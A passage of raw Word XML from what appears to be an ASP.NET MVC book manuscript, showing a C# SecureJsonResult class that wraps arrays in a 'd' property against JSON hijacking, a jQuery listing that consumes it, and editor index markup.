      <w:r w:rsidRPr="00FA5745">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:t>public string ContentType { get; set; }</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:t>public Encoding ContentEncoding { get; set; }</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:t>public object Data { get; set; }</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:t>public override void ExecuteResult(ControllerContext context)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:commentRangeStart w:id="457"/>
      <w:commentRangeStart w:id="458"/>
      <w:r w:rsidRPr="00FA5745">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>if (context == null)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>throw new ArgumentNullException("context");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>HttpResponseBase response = context.HttpContext.Response;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>if (!string.IsNullOrEmpty(ContentType))</w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t xml:space="preserve">                </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t>|#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>{</w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t xml:space="preserve">                                                      </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t>|#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>response.ContentType = ContentType;</w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t xml:space="preserve">               </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t>|#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>}</w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t xml:space="preserve">                                                 </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">          </w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t>|#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    e</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA5745">
        <w:t>lse</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">                                                        </w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t>|#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>{</w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t xml:space="preserve">                                                       </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t>|#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>response.ContentType = "application/json";</w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">          </w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t>|#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>if (ContentEncoding != null)</w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t xml:space="preserve">                                |#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>response.ContentEncoding = ContentEncoding;</w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t xml:space="preserve">          </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="00E04599">
        <w:t>|#2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>if (Data != null)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>var enumerable = Data as IEnumerable;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>if (enumerable != null)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>Data = new {d = enumerable};</w:t>
      </w:r>
      <w:r w:rsidR="00FA5745">
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">              </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745">
        <w:t>#1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>var serializer = new JavaScriptSerializer();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>response.Write(serializer.Serialize(Data));</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745" w:rsidRPr="00FA5745">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:commentRangeEnd w:id="457"/>
    <w:p w:rsidR="00FA5745" w:rsidRDefault="003C6B7A" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:commentReference w:id="457"/>
      </w:r>
      <w:commentRangeEnd w:id="458"/>
      <w:r w:rsidR="001C06F0">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:commentReference w:id="458"/>
      </w:r>
      <w:r w:rsidR="00FA5745">
        <w:t>#1 Wrapping vulnerable</w:t>
      </w:r>
      <w:ins w:id="459" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00EF6E66">
        <w:rPr>
          <w:rPrChange w:id="460" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable</w:instrText>
      </w:r>
      <w:ins w:id="461" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00FA5745">
        <w:t xml:space="preserve"> JSON</w:t>
      </w:r>
      <w:ins w:id="462" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="463" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="464" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00FA5745">
        <w:t xml:space="preserve"> securely</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRDefault="00E04599" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This action result encapsulates this tricky code </w:t>
      </w:r>
      <w:r w:rsidRPr="00E04599">
        <w:rPr>
          <w:rStyle w:val="Bold"/>
        </w:rPr>
        <w:t>(2)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to output the proper JSON</w:t>
      </w:r>
      <w:ins w:id="465" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="466" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="467" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve">.  It works well  </w:t>
      </w:r>
      <w:r w:rsidR="00FA5745">
        <w:t>The downside to this approach is that we must use this "d" variable in our JavaScript</w:t>
      </w:r>
      <w:ins w:id="468" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00630D9B">
        <w:rPr>
          <w:rPrChange w:id="469" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JavaScript</w:instrText>
      </w:r>
      <w:ins w:id="470" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00FA5745">
        <w:t xml:space="preserve"> code.  Listing 11.15 shows consuming jQuery.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.15 Consuming SecureJsonResult with jQuery</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:t>$(function() {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:t xml:space="preserve">$.getJSON('/post/getsecurejson', </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
        <w:t>function(data) {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
        <w:t>var options = '';</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
        <w:t>for (var i = 0; i &lt; data.d.length; i++) {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
        <w:t>options += '&lt;option value="' +</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
        <w:t>data.d[i].Id + '"&gt;' + data.d[i].Title +</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00A519BF">
        <w:t xml:space="preserve">          </w:t>
      </w:r>
      <w:r>
        <w:t>#1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
        <w:t>'&lt;/option&gt;';</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
        <w:t>$('#secure').html(options);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRPr="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:tab/>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00FA5745">
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA5745" w:rsidRDefault="00FA5745" w:rsidP="00FA5745">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:t>#1 Using the d variable</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EE5723" w:rsidRDefault="00FA5745" w:rsidP="0058466D">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>Using this technique we can still use GETs to retrieve our JSON</w:t>
      </w:r>
      <w:ins w:id="471" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="472" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="473" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> data, but the JSON is secure because it is never just an array - any arrays are wrapped in a "d" variable.  But we must be sure to access values through the "d" variable </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA5745">
        <w:rPr>
          <w:rStyle w:val="Bold"/>
        </w:rPr>
        <w:t>(1)</w:t>
      </w:r>
      <w:r>
        <w:t>.  This unconventional code can be confusing.</w:t>
      </w:r>
      <w:r w:rsidR="0058466D">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00EE5723">
        <w:t>We recommend using the default behavior of using HTTP POST</w:t>
      </w:r>
      <w:ins w:id="474" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="475" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>POST</w:instrText>
      </w:r>
      <w:ins w:id="476" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00EE5723">
        <w:t xml:space="preserve"> request to retrieve JSON data.  If that becomes a problem, </w:t>
      </w:r>
      <w:r w:rsidR="0058466D">
        <w:t xml:space="preserve">you can switch to this </w:t>
      </w:r>
      <w:r w:rsidR="00EE5723">
        <w:t>technique.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EE5723" w:rsidRDefault="00EE5723" w:rsidP="00EE5723">
      <w:pPr>
        <w:pStyle w:val="Head1"/>
      </w:pPr>
      <w:r>
        <w:t>11.4 Summary</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EE5723" w:rsidRPr="00EE5723" w:rsidRDefault="00EE5723" w:rsidP="00EE5723">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
